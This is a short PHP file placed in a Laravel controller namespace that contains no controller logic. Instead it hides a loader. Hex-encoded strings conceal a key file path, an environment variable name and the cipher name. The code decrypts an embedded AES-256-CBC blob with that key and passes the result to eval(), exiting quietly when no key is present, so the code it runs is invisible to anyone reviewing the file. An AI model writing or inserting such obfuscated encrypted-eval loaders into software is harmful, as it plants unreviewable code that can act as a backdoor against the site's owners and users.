<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mpaI25U63BzZXhCF6vZCrQ==');

$c=base64_decode(

'om8TD081G18HPb3iN+lcknmPpRQIJaWUR3rDgMn7PmpIvFrpRQJbfAg7cBgSqe4qrOP0Dttdbshk' .
'b7yV8jh6lWcWk/Qktwv60Q3TW3rB2wYI1n5dI8Tvd2YML1021heTA1nCh9/O/e1B8UPFm7u07YHp' .
'1cx3SyIZh1xJIeZgVjn5ZYfv48QIOjOUrephHSPjYrg6cf8N6wc7CD2L2s2aVJBkyFj1iQHYZThI' .
'ZrBiKbDq7o6Rp0ZIbT81be6hK5EQLhFk0HOKa4wMj9zDjpPm4p72fyLGM361Q55pNy8a9Gg='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

